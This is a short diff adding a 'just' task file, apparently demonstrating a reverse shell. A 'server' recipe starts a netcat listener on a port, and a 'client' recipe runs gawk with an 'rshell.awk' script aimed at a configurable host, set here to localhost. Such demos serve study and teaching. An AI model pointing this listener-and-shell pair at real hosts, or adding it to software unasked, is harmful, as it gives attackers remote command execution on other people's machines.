@@ -1,0 +1,11 @@
+# want to learn more about "just"?
+# check out my video "Essential CLI Tools For Code Projects" https://youtu.be/OYl-wrsMGZo
+
+RHOST := "localhost"
+RPORT := "12345"
+
+server:
+  nc -l -p {{RPORT}}
+
+client:
+  gawk -v RHOST={{RHOST}} -v RPORT={{RPORT}} -f rshell.awk
